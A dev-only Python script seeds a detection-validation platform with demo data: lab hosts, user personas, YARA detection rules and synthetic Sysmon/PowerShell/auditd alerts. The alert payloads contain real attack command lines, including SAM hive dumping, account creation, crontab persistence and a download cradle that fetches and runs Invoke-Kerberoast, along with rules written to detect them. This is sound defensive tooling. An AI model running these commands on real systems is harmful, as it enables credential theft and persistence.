#!/usr/bin/env python3
"""Seed a DEV stack with the SVS demo data the training guides' screenshots show.

DEV ONLY. It creates users, API keys, test hosts, git repositories, alerts, runs, samples and
validations in whatever ACE the configuration points at, so it refuses to run unless the
instance type is DEV. Nothing it creates is cleaned up: it is meant for a developer's own stack.

    git clone https://github.com/redcanaryco/atomic-red-team /opt/ace/atomic-red-team   # the catalog
    bin/training/svs_demo_seed.py setup    # the training rule repository; prints the config overlay
    (merge the overlay into etc/saq.yaml, then restart git, yara, svs, http-api-v2, ace and ace-http)
    bin/training/svs_demo_seed.py seed     # drive the scenario through the API (~20 minutes)
    bin/training/svs_demo_seed.py seed --resume   # after a failure: skip the phases already done

The story is one lab and one batch, `training-2026-10`: five test hosts, real Atomic Red Team
tests from the catalog repository, and runs in every state a guide shows (started, ended and
waiting for review, reviewed with a validated or a failing result, canceled, error, closed). Alerts
are synthetic Sysmon / PowerShell telemetry submitted through /api/v2/analysis/, carrying the
run's marker where a launcher would put it. Around them: non-test alerts graded TP and FP (so
samples are captured, one conflicted), a YARA QA rule, four validations of rule changes, worklist
resolutions and a coverage snapshot.

Everything the screenshots need to find again (run ids, alert uuids, samples, validations) is
written to data/svs-training/manifest.json, which bin/training/svs_guide_screenshots.py reads.
"""

import argparse
import datetime
import io
import json
import os
import subprocess
import sys
import time
from pathlib import Path

import httpx

SAQ_HOME = Path(os.environ.get("SAQ_HOME", "/opt/ace"))
TRAINING_DIR = SAQ_HOME / "data" / "svs-training"
KEYS_PATH = TRAINING_DIR / "keys.json"
MANIFEST_PATH = TRAINING_DIR / "manifest.json"
RULES_ORIGIN = TRAINING_DIR / "origin" / "rules.git"
RULES_WORK = TRAINING_DIR / "work" / "rules"
RULES_CHECKOUT = TRAINING_DIR / "checkouts" / "rules"
ART_CHECKOUT = TRAINING_DIR / "checkouts" / "art"
ART_ORIGIN = SAQ_HOME / "atomic-red-team"
NAMESPACE = "svs_training"
RULES_REPO_NAME = "detection_rules"
ART_REPO_NAME = "atomic_red_team"

BASE_URL = os.environ.get("SVS_TRAINING_BASE_URL", "https://ace-http")
BATCH = "training-2026-10"
LAUNCHER = "art-launcher 1.4 (Invoke-AtomicTest)"
GUI_PASSWORD = "Training-2026!"
PR_BASE = "https://git.lab.example/detection/rules/pulls"

# --- the lab ----------------------------------------------------------------------------------

HOSTS = {
    "win10-art-01": {"fqdn": "win10-art-01.lab.example", "platform": "windows", "usernames": ["LAB\\svc_art"], "ips": ["10.20.30.11"]},
    "win10-art-02": {"fqdn": "win10-art-02.lab.example", "platform": "windows", "usernames": ["LAB\\svc_art"], "ips": ["10.20.30.12"]},
    "win10-art-03": {"fqdn": "win10-art-03.lab.example", "platform": "windows", "usernames": ["LAB\\svc_art"], "ips": ["10.20.30.13"]},
    "win11-art-01": {"fqdn": "win11-art-01.lab.example", "platform": "windows", "usernames": [], "ips": ["10.20.30.14"]},
    "ubuntu-art-01": {"fqdn": "ubuntu-art-01.lab.example", "platform": "linux", "usernames": ["svc_art"], "ips": ["10.20.30.21"]},
}

# real Atomic Red Team tests (atomics/<technique>/<technique>.yaml)
TESTS = {
    "sam": "5c2571d0-1572-416d-9676-812e64ca9f44",        # T1003.002 Registry dump of SAM, creds, and secrets
    "kerberoast": "3f987809-3681-43c8-bcd8-b3ff3a28533a", # T1558.003 Request for service tickets
    "netuser": "6657864e-0323-4206-9344-ac9cd7265a4f",    # T1136.001 Create a new user in a command prompt
    "service": "981e2942-e433-44e9-afc1-8c957a1496b6",    # T1543.003 Service Installation CMD
    "bits": "3c73d728-75fb-4180-a12f-6712864d7421",       # T1197 Bitsadmin Download (cmd)
    "rundll32": "638730e7-7aed-43dc-bf8c-8117f805f5bb",   # T1218.011 Rundll32 execute VBscript command
    "cron": "435057fb-74b1-410e-9403-d81baf194f75",       # T1053.003 Cron - Replace crontab with referenced file
}

PERSONAS = {
    # GUI users
    "alice": {"display": "Alice Chen", "perms": ["alert:read", "alert:write", "event:read", "svs:run_read",
                                                  "svs:run_manage", "signature:read", "signature:download"]},
    "bob": {"display": "Bob Ortiz", "perms": ["alert:read", "alert:write", "event:read", "svs:run_read",
                                               "svs:run_manage", "signature:read", "signature:download"]},
    "dana": {"display": "Dana Brooks", "perms": ["alert:*", "event:*", "signature:*", "svs:*", "admin:read"]},
    # automation users, each with a key scoped to what it does
    "art-launcher": {"display": "ART launcher", "perms": ["svs:run_register"], "scope": "svs:run_register"},
    "svs-ci": {"display": "SVS CI", "perms": ["svs:validate"], "scope": "svs:validate"},
    "sysmon-feeder": {"display": "Sysmon feeder", "perms": ["alert:create", "alert:read"], "scope": "alert:create,alert:read"},
}

# --- the rules --------------------------------------------------------------------------------

def _rule(name, uuid, description, strings, condition="all of them", mitre=None, extra_meta=None):
    meta = [f'        uuid = "{uuid}"', f'        description = "{description}"', '        author = "Detection Engineering"']
    if mitre:
        meta.append(f'        mitre_attack = "{mitre}"')
    for key, value in (extra_meta or {}).items():
        meta.append(f'        {key} = "{value}"')
    body = "\n".join(f"        {s}" for s in strings)
    return f"rule {name}\n{{\n    meta:\n" + "\n".join(meta) + f"\n    strings:\n{body}\n    condition:\n        {condition}\n}}\n"


UUID = {name: f"7a1d0000-5e5f-4c11-9000-0000000000{i:02d}" for i, name in enumerate(
    ["sam", "kerberoast", "cradle", "encoded", "netuser", "service", "rundll32", "cron", "whoami", "certutil",
     "comsvcs"], start=1)}

RULE_FILES = {
    "credential_access.yar": "\n".join([
        _rule("CA_Registry_SAM_Save", UUID["sam"], "reg.exe saving the SAM hive to disk",
              ['$save = "reg save" nocase', '$hive = "hklm" nocase'], mitre="T1003.002,T1552.002"),
        _rule("CA_PowerShell_Invoke_Kerberoast", UUID["kerberoast"], "PowerShell running Invoke-Kerberoast",
              ['$a = "Invoke-Kerberoast" nocase'], condition="$a", mitre="T1558.003"),
    ]),
    "execution.yar": "\n".join([
        _rule("EX_PowerShell_Download_Cradle", UUID["cradle"], "PowerShell download cradle: IEX over a web request",
              ['$iex = "iex(" nocase', '$iwr = "iwr " nocase', '$dl = "DownloadString" nocase'],
              condition="$iex and ($iwr or $dl)"),
        _rule("EX_PowerShell_Encoded_Command", UUID["encoded"], "PowerShell started with an encoded command",
              ['$a = "-EncodedCommand" nocase'], condition="$a", mitre="T1059.001"),
    ]),
    "persistence.yar": "\n".join([
        _rule("PE_Net_User_Add", UUID["netuser"], "net.exe creating a local account",
              ['$a = "net user" nocase', '$b = "/add" nocase'], mitre="T1136.001,T1098,T1078.003"),
        _rule("PE_Sc_Create_Service", UUID["service"], "sc.exe creating a service",
              ['$a = "sc.exe create" nocase', '$b = "binPath=" nocase'], mitre="T1543.003"),
        _rule("PE_Crontab_Replaced", UUID["cron"], "A user's crontab replaced from a file in /tmp",
              ['$a = "crontab /tmp/"', '$b = "* * * * *"']),
    ]),
    "defense_evasion.yar": _rule(
        "DE_Rundll32_Script_Protocol", UUID["rundll32"], "rundll32 running a vbscript: or javascript: URL",
        ['$r = "rundll32" nocase', '$vbs = "vbscript:" nocase', '$js = "javascript:" nocase'],
        condition="$r and ($vbs or $js)", mitre="T1218.011"),
    "discovery.yar": _rule(
        "DI_Whoami_All_Groups", UUID["whoami"], "whoami listing the user's groups and privileges",
        ['$a = "whoami /all" nocase', '$b = "whoami /groups" nocase'], condition="any of them", mitre="T1033"),
    "qa.yar": _rule(
        "QA_Certutil_URLCache_Download", UUID["certutil"], "certutil downloading a file (QA: measuring noise)",
        ['$a = "certutil" nocase', '$b = "-urlcache" nocase'], extra_meta={"modifiers": "qa"}),
}

# --- telemetry --------------------------------------------------------------------------------

def sysmon_event(host: str, user: str, image: str, command_line: str, parent: str, event_id: int = 1) -> bytes:
    event = {
        "EventID": event_id, "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": HOSTS.get(host, {}).get("fqdn", f"{host}.lab.example"),
        "UtcTime": datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        "User": user, "Image": image, "CommandLine": command_line, "ParentImage": parent,
        "IntegrityLevel": "High",
    }
    return (json.dumps(event, indent=2) + "\n").encode()


def script_block(host: str, text: str) -> bytes:
    event = {
        "EventID": 4104, "Channel": "Microsoft-Windows-PowerShell/Operational",
        "Computer": HOSTS.get(host, {}).get("fqdn", f"{host}.lab.example"),
        "ScriptBlockText": text,
    }
    return (json.dumps(event, indent=2) + "\n").encode()


def auditd_execve(host: str, command: str) -> bytes:
    return (f'type=EXECVE msg=audit({time.time():.3f}:4711): argc=3 a0="bash" a1="-c" a2="{command}"\n'
            f'type=SYSCALL host={host} uid=1001 auid=1001 exe="/usr/bin/bash" key="art"\n').encode()


# --- plumbing ---------------------------------------------------------------------------------

def log(msg: str):
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def git(*args, cwd=None) -> str:
    return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


def ace_environment():
    sys.path.insert(0, str(SAQ_HOME))
    os.chdir(SAQ_HOME)
    # ACE's own imports wait for SAQ_HOME on sys.path (this script runs from bin/training/), here and in
    # the functions below that import them
    from saq.environment import initialize_environment
    initialize_environment()
    from saq.configuration.config import get_config
    if str(get_config().global_settings.instance_type) != "DEV":
        sys.exit(f"refusing to run: instance_type is {get_config().global_settings.instance_type}, not DEV")


KEYS: dict[str, str] = {}


def client(persona: str) -> httpx.Client:
    return httpx.Client(base_url=BASE_URL, verify=False, timeout=60, headers={"x-ace-auth": KEYS[persona]})


def ok(r: httpx.Response, *codes):
    codes = codes or (200, 201, 202, 204)
    if r.status_code not in codes:
        raise RuntimeError(f"{r.request.method} {r.request.url} -> {r.status_code}: {r.text[:2000]}")
    try:
        return r.json()
    except ValueError:
        return r.text


def wait(pred, timeout=300, interval=3, what="condition"):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if (v := pred()):
            return v
        time.sleep(interval)
    raise TimeoutError(f"timed out waiting for {what}")


def sql(query: str, params=()) -> list[dict]:
    from saq.database.pool import get_db_connection  # after ace_environment(), see there
    with get_db_connection() as db:
        cur = db.cursor()
        cur.execute(query, params)
        rows = [] if cur.description is None else [dict(zip([d[0] for d in cur.description], r)) for r in cur.fetchall()]
        db.commit()
        return rows


def user_id(username: str) -> int:
    return sql("SELECT id FROM users WHERE username=%s", (username,))[0]["id"]


# --- setup ------------------------------------------------------------------------------------

OVERLAY = f"""\
# DEV ONLY: SVS training demo (bin/training/svs_demo_seed.py). Never part of a PR.
git_repo_{ART_REPO_NAME}:
  name: {ART_REPO_NAME}
  description: Atomic Red Team (local clone)
  local_path: {ART_CHECKOUT}
  git_url: {ART_ORIGIN}
  branch: master
  update_frequency: 60

git_repo_{RULES_REPO_NAME}:
  name: {RULES_REPO_NAME}
  description: Detection Engineering YARA rules
  local_path: {RULES_CHECKOUT}
  git_url: {RULES_ORIGIN}
  branch: main
  update_frequency: 30

svs:
  log_search_url: https://splunk.lab.example/en-US/app/search/search?q=search%20index%3Dace%20svs_run%3D{{run_uuid}}&earliest={{earliest}}&latest={{latest}}
  catalog:
    repositories: [{ART_REPO_NAME}]
  runs:
    start_timeout_minutes: 5
    observation_window:
      slack_minutes: 0
      floor_minutes: 3
      ceiling_hours: 2
  yara:
    repositories: [{RULES_REPO_NAME}]

service_yara:
  git_repo_dirs: [{NAMESPACE}]
"""


def setup(_args):
    for d in (RULES_ORIGIN.parent, RULES_WORK.parent, RULES_CHECKOUT.parent):
        d.mkdir(parents=True, exist_ok=True)
    if not RULES_ORIGIN.exists():
        git("init", "--bare", "-b", "main", str(RULES_ORIGIN))
    if not RULES_WORK.exists():
        git("clone", str(RULES_ORIGIN), str(RULES_WORK))
        git("config", "user.name", "Detection Engineering", cwd=RULES_WORK)
        git("config", "user.email", "detection@lab.example", cwd=RULES_WORK)
        git("checkout", "-b", "main", cwd=RULES_WORK)
    # the rules as this script defines them, committed to main whenever they differ
    git("checkout", "-q", "main", cwd=RULES_WORK)
    rules_dir = RULES_WORK / NAMESPACE
    rules_dir.mkdir(exist_ok=True)
    for stale in rules_dir.glob("*.yar"):
        if stale.name not in RULE_FILES:
            stale.unlink()
    for name, text in RULE_FILES.items():
        (rules_dir / name).write_text(text)
    git("add", "-A", cwd=RULES_WORK)
    if git("status", "--porcelain", cwd=RULES_WORK):
        git("commit", "-m", "Detection rules for the ART lab", cwd=RULES_WORK)
        git("push", "-u", "origin", "main", cwd=RULES_WORK)
    if not RULES_CHECKOUT.exists():
        git("clone", "-b", "main", str(RULES_ORIGIN), str(RULES_CHECKOUT))
    link = SAQ_HOME / "signatures" / "yara" / NAMESPACE
    if not link.exists():
        link.symlink_to(RULES_CHECKOUT / NAMESPACE)
    print(f"Rule repository: {RULES_ORIGIN} (working copy {RULES_WORK}), linked at {link}.\n")
    print("Merge this into etc/saq.yaml (lists append, so keep any existing entries):\n")
    print(OVERLAY)
    print("Then, from the host: docker compose up -d && docker compose restart git yara svs http-api-v2 ace "
          "&& docker compose restart ace-http")


# --- seed -------------------------------------------------------------------------------------

def ensure_personas():
    # after ace_environment(), see there
    from saq.database.util.user_management import add_user, create_api_key
    from saq.permissions.logic import parse_permission_pattern
    from saq.permissions.user import add_user_permission

    keys = json.loads(KEYS_PATH.read_text()) if KEYS_PATH.exists() else {}
    for username, p in PERSONAS.items():
        if not sql("SELECT id FROM users WHERE username=%s", (username,)):
            user = add_user(username=username, email=f"{username}@lab.example", display_name=p["display"],
                            password=GUI_PASSWORD, timezone="UTC")
            for perm in p["perms"]:
                major, minor = perm.split(":")
                add_user_permission(user.id, major, minor)
            log(f"user {username} created")
        if username not in keys:
            uid = user_id(username)
            if "scope" in p:
                scope = [parse_permission_pattern(s) for s in p["scope"].split(",")]
                keys[username] = create_api_key(uid, name="training", scope=scope)
            else:
                keys[username] = create_api_key(uid, name="training", inherit=True)
    KEYS_PATH.write_text(json.dumps(keys, indent=1))
    KEYS.update(keys)


def ensure_hosts():
    with client("dana") as c:
        for name, h in HOSTS.items():
            r = c.post("/api/v2/svs/test-hosts/", json={"hostname": h["fqdn"], "usernames": h["usernames"],
                                                       "ips": h["ips"], "platform": h["platform"]})
            ok(r, 201, 409)


def submit(description: str, host: str, files: dict[str, bytes], *, user: str | None = None,
           tool: str = "sysmon", details: dict | None = None) -> str:
    observables = [{"type": "hostname", "value": host}]
    if user:
        observables.append({"type": "user", "value": user})
    sub = {"description": description, "analysis_mode": "correlation", "tool": tool,
           "tool_instance": "wec-01.lab.example", "type": tool, "observables": observables,
           "details": details or {}}
    multipart = [("file", (name, io.BytesIO(data), "application/octet-stream")) for name, data in files.items()]
    with client("sysmon-feeder") as c:
        return ok(c.post("/api/v2/analysis/", data={"analysis": json.dumps(sub)}, files=multipart), 201)["uuid"]


def wait_alert(uuid: str, timeout=300) -> dict:
    return wait(lambda: (rows := sql("SELECT id, uuid, queue, disposition FROM alerts WHERE uuid=%s", (uuid,)))
                and rows[0], timeout=timeout, what=f"alert {uuid}")


def register(test: str, host: str, username: str | None = "LAB\\svc_art", **extra) -> dict:
    body = {"test_guid": TESTS[test], "targets": [{"hostname": HOSTS[host]["fqdn"], "username": username}],
            "launcher": LAUNCHER, "batch_id": BATCH, "extra": extra}

    def attempt():
        with client("art-launcher") as c:
            r = c.post("/api/v2/svs/runs/", json=body)
        # one run per test host: a started run's claim ends by itself, so wait it out; a run that hasn't
        # started holds the host until it is canceled, which is a mistake in this script's order
        holders = r.json()["detail"].get("holders") if r.status_code == 409 else None
        if holders and all(h["until"] for h in holders):
            return None
        return ok(r, 201)

    run = wait(attempt, timeout=600, interval=10, what=f"{host} to be free for {test}")
    log(f"registered {test} on {host}: {run['run_id']} {run['marker']}")
    return run


def launcher_call(run_id: str, action: str, body: dict | None = None) -> dict:
    with client("art-launcher") as c:
        return ok(c.post(f"/api/v2/svs/runs/{run_id}/{action}", json=body))


def run_get(run_id: str) -> dict:
    with client("dana") as c:
        return ok(c.get(f"/api/v2/svs/runs/{run_id}"))


def wait_state(run_id: str, *states, timeout=600) -> dict:
    return wait(lambda: (r := run_get(run_id))["state"] in states and r, timeout=timeout, interval=5,
                what=f"run {run_id} in {states}")


def wait_fresh(run_id: str) -> dict:
    return wait(lambda: not (r := run_get(run_id))["result_stale"] and r, timeout=120, what=f"run {run_id} result")


def results(run_id: str) -> list[dict]:
    with client("dana") as c:
        return ok(c.get(f"/api/v2/svs/runs/{run_id}/results"))["data"]


def expect(persona: str, test: str, signature: str, state: str, run_id: str, reason: str):
    with client(persona) as c:
        ok(c.put(f"/api/v2/svs/tests/{TESTS[test]}/expectations/{run_get(run_id)['platform']}/{UUID[signature]}",
                 json={"state": state, "run_id": run_id, "reason": reason}))


def comment(persona: str, run_id: str, text: str):
    with client(persona) as c:
        ok(c.post(f"/api/v2/svs/runs/{run_id}/comments", json={"comment": text}), 201)


def take(persona: str, *run_ids: str):
    with client(persona) as c:
        ok(c.post("/api/v2/svs/runs/bulk/take-ownership", json={"run_ids": list(run_ids)}))


def review(persona: str, run_id: str):
    with client(persona) as c:
        ok(c.post(f"/api/v2/svs/runs/{run_id}/review", json={}))
    log(f"{persona} reviewed {run_id}")


def disposition(uuids: list[str], value: str, persona: str, note: str):
    from saq.database.util.alert import set_dispositions  # after ace_environment(), see there
    set_dispositions(uuids, value, user_id(persona), user_comment=note)


def phase_one(m: dict):
    """Runs on four hosts at once: three that fire and are reviewed (phase_one_review), one canceled, one
    error, one closed. A test host takes one run at a time: the run that never starts is canceled before
    the next registers on its host, and bits gets a host of its own."""
    service_never = register("service", "win10-art-02", ticket="LAB-1042")
    launcher_call(service_never["run_id"], "cancel")
    sam = register("sam", "win10-art-01", ticket="LAB-1042")
    netuser = register("netuser", "win10-art-02", ticket="LAB-1042")
    cron = register("cron", "ubuntu-art-01", username="svc_art", ticket="LAB-1042")
    rundll = register("rundll32", "win11-art-01", username=None, ticket="LAB-1042")
    bits = register("bits", "win10-art-03", ticket="LAB-1042")
    for run in (sam, netuser, cron, rundll, bits):
        launcher_call(run["run_id"], "start")
    time.sleep(2)

    m["alerts"]["sam"] = submit(
        "Sysmon: reg.exe saved the SAM hive on win10-art-01", "win10-art-01",
        {"sysmon-1-reg-save.json": sysmon_event(
            "win10-art-01", "LAB\\svc_art", "C:\\Windows\\System32\\reg.exe",
            f"reg save HKLM\\sam C:\\Users\\svc_art\\AppData\\Local\\Temp\\sam_{sam['marker']}",
            "C:\\Windows\\System32\\cmd.exe")}, user="svc_art")
    m["alerts"]["netuser"] = submit(
        "Sysmon: net.exe created a local account on win10-art-02", "win10-art-02",
        {"sysmon-1-net-user.json": sysmon_event(
            "win10-art-02", "LAB\\svc_art", "C:\\Windows\\System32\\net.exe",
            f'net user /add "art_{netuser["marker"]}" "T1136.001_CMD!"', "C:\\Windows\\System32\\cmd.exe")},
        user="svc_art")
    m["alerts"]["cron"] = submit(
        "auditd: crontab replaced from /tmp on ubuntu-art-01", "ubuntu-art-01",
        {"auditd-execve.log": auditd_execve(
            "ubuntu-art-01", f'echo \\"* * * * * /tmp/evil.sh {cron["marker"]}\\" > /tmp/persistevil && '
                             'crontab /tmp/persistevil')}, tool="auditd", user="svc_art")

    time.sleep(20)
    launcher_call(rundll["run_id"], "cancel")
    launcher_call(bits["run_id"], "executed", {
        "exit_code": 1, "error": "BITSADMIN: Unable to complete transfer. 0x80190197 (HTTP 407 proxy authentication "
                                 "required) for raw.githubusercontent.com"})
    m["runs"].update({"sam": sam["run_id"], "netuser": netuser["run_id"], "cron": cron["run_id"],
                      "rundll32": rundll["run_id"], "bits": bits["run_id"], "service_never": service_never["run_id"]})

    # a launcher pointed at a production workstation is refused, and ACE raises an alert about it
    with client("art-launcher") as c:
        r = c.post("/api/v2/svs/runs/", json={"test_guid": TESTS["sam"], "launcher": LAUNCHER, "batch_id": BATCH,
                                              "targets": [{"hostname": "fin-ws-042.corp.example", "username": "CORP\\jsmith"}]})
        log(f"refused registration -> {r.status_code}")


def phase_one_review(m: dict):
    for key in ("sam", "netuser", "cron"):
        wait_alert(m["alerts"][key])
    for key in ("sam", "netuser", "cron"):
        wait_state(m["runs"][key], "ended")
        wait_fresh(m["runs"][key])

    take("alice", m["runs"]["sam"], m["runs"]["netuser"], m["runs"]["cron"])
    expect("alice", "sam", "sam", "expected", m["runs"]["sam"], "What the test does: reg save of the SAM hive.")
    expect("alice", "netuser", "netuser", "expected", m["runs"]["netuser"], "Local account creation, the test's technique.")
    expect("alice", "cron", "cron", "expected", m["runs"]["cron"], "The test replaces the crontab from /tmp.")
    for key in ("sam", "netuser", "cron"):
        wait_fresh(m["runs"][key])
        review("alice", m["runs"][key])
    comment("alice", m["runs"]["sam"], "CA_Registry_SAM_Save fired about 40 seconds after start. Recorded it as expected.")
    take("bob", m["runs"]["bits"])
    comment("bob", m["runs"]["bits"], "The lab proxy wants authentication for raw.githubusercontent.com. Asked infra "
                                      "(LAB-1051) to allow it from the ART VLAN; will rerun after.")


def phase_two(m: dict):
    """A rerun that misses its expected signature (failing), and a run left waiting for review."""
    netuser2 = register("netuser", "win10-art-02", ticket="LAB-1042", rerun_of=m["runs"]["netuser"])
    roast = register("kerberoast", "win10-art-03", ticket="LAB-1042")
    for run in (netuser2, roast):
        launcher_call(run["run_id"], "start")
    time.sleep(2)
    marker = roast["marker"]
    cradle = ("iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/"
              "data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)")
    m["alerts"]["kerberoast"] = submit(
        "PowerShell script block: Invoke-Kerberoast on win10-art-03", "win10-art-03",
        {"ps-4104-kerberoast.json": script_block("win10-art-03", f"# {marker}\n{cradle}\nInvoke-Kerberoast | fl")},
        tool="powershell", user="svc_art")
    m["alerts"]["context"] = submit(
        "Defender: HackTool:PowerShell/Kerberoast quarantined on win10-art-03", "win10-art-03",
        {"defender-quarantine.txt": b"ThreatName: HackTool:PowerShell/Kerberoast\nResource: "
                                    b"C:\\Users\\svc_art\\AppData\\Local\\Temp\\Invoke-Kerberoast.ps1\n"},
        tool="defender")
    m["alerts"]["partial"] = submit(
        "PowerShell activity on win10-art-03: two scripts", "win10-art-03",
        {"ps-4104-a.json": script_block("win10-art-03", f"# {marker}\nInvoke-Kerberoast -OutputFormat Hashcat"),
         "ps-4104-b.json": script_block("win10-art-03", "powershell.exe -NoProfile -EncodedCommand "
                                                         "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=")},
        tool="powershell")
    m["alerts"]["mismatch"] = submit(
        "PowerShell script block: Invoke-Kerberoast on win11-art-01", "win11-art-01",
        {"ps-4104-other-host.json": script_block("win11-art-01", f"# {marker}\nInvoke-Kerberoast | fl")},
        tool="powershell")
    m["runs"].update({"netuser_rerun": netuser2["run_id"], "kerberoast": roast["run_id"]})
    for key in ("kerberoast", "context", "partial", "mismatch"):
        wait_alert(m["alerts"][key])
    wait_state(netuser2["run_id"], "ended")
    wait_fresh(netuser2["run_id"])
    take("alice", netuser2["run_id"])
    review("alice", netuser2["run_id"])
    comment("alice", netuser2["run_id"], "PE_Net_User_Add did not fire. win10-art-02 was rebuilt on Monday and its "
                                         "Sysmon config lost process creation for net.exe. Fixed; rerun in the next batch.")
    wait_state(roast["run_id"], "ended")


def phase_samples(m: dict):
    """Alerts outside the lab, graded TP and FP, so their YARA hits become samples."""
    invoice = (b"$c = 'SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAuADEA'\n"
               b"powershell.exe -WindowStyle Hidden -EncodedCommand $c\n")
    deploy = (b"# IT: deploy the monitoring agent to new laptops (CHG-2210)\n"
              b"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
              b"UwB0AGEAcgB0AC0AUwBlAHIAdgBpAGMAZQAgAG0AbwBuAGkAdABvAHIAaQBuAGcAQQBnAGUAbgB0AA==\n")
    backup = (b"# nightly backup job, scheduled by the backup team\n"
              b"powershell.exe -EncodedCommand UgB1AG4ALQBCAGEAYwBrAHUAcAAgAC0ATgBpAGcAaAB0AGwAeQA=\n")
    m["alerts"]["invoice"] = submit("Email attachment invoice_0921.ps1 opened on fin-ws-042", "fin-ws-042",
                                    {"invoice_0921.ps1": invoice}, tool="email", user="jsmith")
    m["alerts"]["deploy_fp"] = submit("Encoded PowerShell on it-mgmt-01", "it-mgmt-01",
                                      {"deploy_agent.ps1": deploy}, user="svc_deploy")
    m["alerts"]["deploy_tp"] = submit("Encoded PowerShell on it-mgmt-02", "it-mgmt-02",
                                      {"deploy_agent.ps1": deploy}, user="svc_deploy")
    m["alerts"]["backup_fp"] = submit("Encoded PowerShell on backup-01", "backup-01",
                                      {"nightly_backup.ps1": backup}, user="svc_backup")
    # a QA rule's match is recorded for review and raises no alert of its own
    submit("certutil activity on hr-ws-007", "hr-ws-007",
           {"sysmon-1-certutil.json": sysmon_event("hr-ws-007", "CORP\\mlee", "C:\\Windows\\System32\\certutil.exe",
                                                   "certutil.exe -urlcache -split -f http://10.1.2.3/tools/7z.exe 7z.exe",
                                                   "C:\\Windows\\explorer.exe")}, user="mlee")
    for key in ("invoice", "deploy_fp", "deploy_tp", "backup_fp"):
        wait_alert(m["alerts"][key])
    time.sleep(20)  # let correlation finish before the dispositions
    disposition([m["alerts"]["invoice"]], "DELIVERY", "alice", "Phishing attachment; user reported it.")
    disposition([m["alerts"]["deploy_fp"], m["alerts"]["backup_fp"]], "FALSE_POSITIVE", "alice",
                "Approved IT automation (CHG-2210, backup job).")
    disposition([m["alerts"]["deploy_tp"]], "DELIVERY", "bob", "Unexpected encoded PowerShell on it-mgmt-02.")


def push_branch(branch: str, edit) -> str:
    git("checkout", "-q", "main", cwd=RULES_WORK)
    git("checkout", "-q", "-B", branch, cwd=RULES_WORK)
    edit(RULES_WORK / NAMESPACE)
    git("add", "-A", cwd=RULES_WORK)
    git("commit", "-q", "-m", branch, cwd=RULES_WORK)
    git("push", "-q", "-f", "origin", branch, cwd=RULES_WORK)
    head = git("rev-parse", "HEAD", cwd=RULES_WORK)
    git("checkout", "-q", "main", cwd=RULES_WORK)
    return head


def _replace(path: Path, old: str, new: str):
    text = path.read_text()
    assert old in text, (path, old)
    path.write_text(text.replace(old, new))


def phase_validations(m: dict):
    # the corpus a validation replays: the TP samples of the reviewed runs, and the graded alerts' files
    for rule in ("sam", "netuser", "cron", "encoded"):
        wait(lambda: sql("SELECT 1 FROM svs_yara_captures WHERE rule_uuid=%s AND state='stored' LIMIT 1", (UUID[rule],)),
             timeout=600, interval=10, what=f"a stored sample of {rule}")
    base = git("rev-parse", "main", cwd=RULES_WORK)
    changes = {
        "tune-sam-reg-exe": (412, lambda d: _replace(d / "credential_access.yar", '"reg save" nocase', '"reg.exe save" nocase')),
        "broaden-kerberoast-encoded": (415, lambda d: _replace(
            d / "credential_access.yar", '$a = "Invoke-Kerberoast" nocase\n    condition:\n        $a',
            '$a = "Invoke-Kerberoast" nocase\n        $enc = "-EncodedCommand" nocase\n    condition:\n        any of them')),
        "add-comsvcs-minidump": (418, lambda d: (d / "credential_access_comsvcs.yar").write_text(_rule(
            "CA_LSASS_Dump_Comsvcs", UUID["comsvcs"], "rundll32 comsvcs.dll MiniDump of lsass",
            ['$a = "comsvcs.dll" nocase', '$b = "MiniDump" nocase'], mitre="T1003.001"))),
    }
    m["validations"] = {}
    with client("svs-ci") as c:
        for branch, (pr, edit) in changes.items():
            head = push_branch(branch, edit)
            r = ok(c.post("/api/v2/svs/yara/validations/", json={
                "repository": RULES_REPO_NAME, "base_sha": base, "head_sha": head, "branch": branch,
                "pr_url": f"{PR_BASE}/{pr}"}), 200, 202)
            m["validations"][branch] = r["uuid"]
            log(f"validation {branch}: {r['uuid']}")
        # a CI job that ran before its branch was pushed: the commit isn't in the repository
        r = ok(c.post("/api/v2/svs/yara/validations/", json={
            "repository": RULES_REPO_NAME, "base_sha": base, "head_sha": "4f1c2b9e" * 5,
            "branch": "fix-service-binpath", "pr_url": f"{PR_BASE}/420"}), 200, 202)
        m["validations"]["fix-service-binpath"] = r["uuid"]
        for branch, uuid in m["validations"].items():
            wait(lambda: ok(c.get(f"/api/v2/svs/yara/validations/{uuid}/status"))["state"] in ("completed", "failed"),
                 timeout=900, interval=10, what=f"validation {branch}")


def phase_history(m: dict):
    """Second runs of two tests, reviewed by someone else: the run pages' history of earlier runs."""
    sam = register("sam", "win10-art-01", ticket="LAB-1057")
    cron = register("cron", "ubuntu-art-01", username="svc_art", ticket="LAB-1057")
    for run in (sam, cron):
        launcher_call(run["run_id"], "start")
    time.sleep(2)
    m["alerts"]["sam_rerun"] = submit(
        "Sysmon: reg.exe saved the SAM hive on win10-art-01", "win10-art-01",
        {"sysmon-1-reg-save.json": sysmon_event(
            "win10-art-01", "LAB\\svc_art", "C:\\Windows\\System32\\reg.exe",
            f"reg save HKLM\\sam C:\\Users\\svc_art\\AppData\\Local\\Temp\\sam_{sam['marker']}",
            "C:\\Windows\\System32\\cmd.exe")}, user="svc_art")
    m["alerts"]["cron_rerun"] = submit(
        "auditd: crontab replaced from /tmp on ubuntu-art-01", "ubuntu-art-01",
        {"auditd-execve.log": auditd_execve(
            "ubuntu-art-01", f'echo \\"* * * * * /tmp/evil.sh {cron["marker"]}\\" > /tmp/persistevil && '
                             'crontab /tmp/persistevil')}, tool="auditd", user="svc_art")
    m["runs"].update({"sam_rerun": sam["run_id"], "cron_rerun": cron["run_id"]})
    for key in ("sam_rerun", "cron_rerun"):
        wait_alert(m["alerts"][key])
        wait_state(m["runs"][key], "ended")
        wait_fresh(m["runs"][key])
    take("bob", sam["run_id"], cron["run_id"])
